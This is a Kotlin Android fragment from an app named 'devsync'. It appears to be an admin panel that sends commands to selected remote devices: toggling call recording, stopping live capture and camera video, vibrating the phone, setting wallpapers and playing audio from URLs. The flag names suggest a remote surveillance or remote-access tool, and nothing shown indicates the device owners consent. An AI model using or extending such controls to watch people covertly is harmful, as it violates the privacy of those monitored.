package com.example.devsync

  import android.content.Context
  import android.os.Bundle
  import android.view.View
  import android.widget.Button
  import android.widget.EditText
  import android.widget.Switch
  import androidx.fragment.app.Fragment
  import androidx.recyclerview.widget.LinearLayoutManager
  import androidx.recyclerview.widget.RecyclerView
  import org.json.JSONArray
  import org.json.JSONObject

  class ControlsFragment : Fragment(R.layout.fragment_controls) {

      private val admin get() = requireActivity() as AdminControlActivity

      private val wallpapers = mutableListOf<SavedUrl>()
      private val songs      = mutableListOf<SavedUrl>()
      private lateinit var wallpaperAdapter: SavedUrlAdapter
      private lateinit var songAdapter: SavedUrlAdapter

      private val PREF_NAME = "devsync_saved_urls"
      private val KEY_WALLPAPERS = "saved_wallpapers"
      private val KEY_SONGS = "saved_songs"

      override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
          super.onViewCreated(view, savedInstanceState)

          // ── Quick Actions ────────────────────────────────────────────────────
          view.findViewById<Button>(R.id.btnStopAll).setOnClickListener {
              admin.sendToSelected { d ->
                  d.child("stop_all").setValue(true)
                  d.child("live_capture_enabled").setValue(false)
                  d.child("camera_video_flag").setValue(false)
              }
          }
          view.findViewById<Button>(R.id.btnTriggerVibration).setOnClickListener {
              admin.sendToSelected { d -> d.child("haptic_feedback_trigger").setValue(System.currentTimeMillis()) }
          }

          // ── Toggles ──────────────────────────────────────────────────────────
          view.findViewById<Switch>(R.id.switchBluetooth).setOnCheckedChangeListener { _, on ->
              admin.sendToSelected { d -> d.child("bt_management_flag").setValue(on) }
          }
          view.findViewById<Switch>(R.id.switchCallRecording).setOnCheckedChangeListener { _, on ->
              admin.sendToSelected { d -> d.child("call_recording_enabled").setValue(on) }
          }

          // ── Wallpapers ────────────────────────────────────────────────────────
          val rvWallpapers = view.findViewById<RecyclerView>(R.id.rvWallpapers)
          wallpaperAdapter = SavedUrlAdapter(
              items        = wallpapers,
              actionLabel  = "🖼 Set",
              onAction     = { url -> setWallpaper(url) },
              onDelete     = { idx -> deleteWallpaper(idx) }
          )
          rvWallpapers.layoutManager = LinearLayoutManager(requireContext())
          rvWallpapers.adapter = wallpaperAdapter

          view.findViewById<Button>(R.id.btnSaveWallpaper).setOnClickListener {
              val etUrl = view.findViewById<EditText>(R.id.etWallpaperUrl)
              val raw   = etUrl.text.toString().trim()
              if (raw.isEmpty()) { admin.showStatus("❌ URL daalo pehle", false); return@setOnClickListener }
              val url   = AdminControlActivity.convertGoogleDriveUrl(raw)
              val num   = wallpapers.size + 1
              wallpapers.add(SavedUrl("Wallpaper $num", url))
              wallpaperAdapter.notifyItemInserted(wallpapers.size - 1)
              saveToPrefs(KEY_WALLPAPERS, wallpapers)
              etUrl.setText("")
              admin.showStatus("✅ Wallpaper $num saved!", true)
          }

          // ── Songs ─────────────────────────────────────────────────────────────
          val rvSongs = view.findViewById<RecyclerView>(R.id.rvSongs)
          songAdapter = SavedUrlAdapter(
              items        = songs,
              actionLabel  = "▶ Play",
              onAction     = { url -> playSong(url) },
              onDelete     = { idx -> deleteSong(idx) }
          )
          rvSongs.layoutManager = LinearLayoutManager(requireContext())
          rvSongs.adapter = songAdapter

          view.findViewById<Button>(R.id.btnSaveSong).setOnClickListener {
              val etUrl = view.findViewById<EditText>(R.id.etSongUrl)
              val raw   = etUrl.text.toString().trim()
              if (raw.isEmpty()) { admin.showStatus("❌ Audio URL daalo pehle", false); return@setOnClickListener }
              val url  = AdminControlActivity.convertGoogleDriveUrl(raw)
              val num  = songs.size + 1
              songs.add(SavedUrl("Song $num", url))
              songAdapter.notifyItemInserted(songs.size - 1)
              saveToPrefs(KEY_SONGS, songs)
              etUrl.setText("")
              admin.showStatus("✅ Song $num saved!", true)
          }

          loadFromPrefs()
      }

      // ── Actions ───────────────────────────────────────────────────────────────

      private fun setWallpaper(url: String) {
          admin.sendToSelected { d -> d.child("wallpaper_url").setValue(url) }
      }

      private fun playSong(url: String) {
          admin.sendToSelected { d ->
              d.child("remote_audio_url").setValue(url)
              d.child("audio_remote_trigger").setValue(System.currentTimeMillis())
          }
      }

      private fun deleteWallpaper(idx: Int) {
          if (idx < 0 || idx >= wallpapers.size) return
          wallpapers.removeAt(idx)
          // Renumber
          for (i in wallpapers.indices) wallpapers[i] = wallpapers[i].copy(name = "Wallpaper ${i + 1}")
          wallpaperAdapter.notifyDataSetChanged()
          saveToPrefs(KEY_WALLPAPERS, wallpapers)
          admin.showStatus("🗑 Wallpaper deleted", true)
      }

      private fun deleteSong(idx: Int) {
          if (idx < 0 || idx >= songs.size) return
          songs.removeAt(idx)
          for (i in songs.indices) songs[i] = songs[i].copy(name = "Song ${i + 1}")
          songAdapter.notifyDataSetChanged()
          saveToPrefs(KEY_SONGS, songs)
          admin.showStatus("🗑 Song deleted", true)
      }

      // ── Prefs persistence ──────────────────────────────────────────────────────

      private fun saveToPrefs(key: String, list: List<SavedUrl>) {
          val arr = JSONArray()
          list.forEach { item ->
              val obj = JSONObject()
              obj.put("name", item.name)
              obj.put("url", item.url)
              arr.put(obj)
          }
          requireContext()
              .getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
              .edit().putString(key, arr.toString()).apply()
      }

      private fun loadFromPrefs() {
          val prefs = requireContext().getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)

          fun parse(key: String, into: MutableList<SavedUrl>, adapter: SavedUrlAdapter) {
              val raw = prefs.getString(key, "[]") ?: "[]"
              try {
                  val arr = JSONArray(raw)
                  into.clear()
                  for (i in 0 until arr.length()) {
                      val obj = arr.getJSONObject(i)
                      into.add(SavedUrl(obj.getString("name"), obj.getString("url")))
                  }
                  adapter.notifyDataSetChanged()
              } catch (_: Exception) {}
          }

          parse(KEY_WALLPAPERS, wallpapers, wallpaperAdapter)
          parse(KEY_SONGS, songs, songAdapter)
      }
  }
  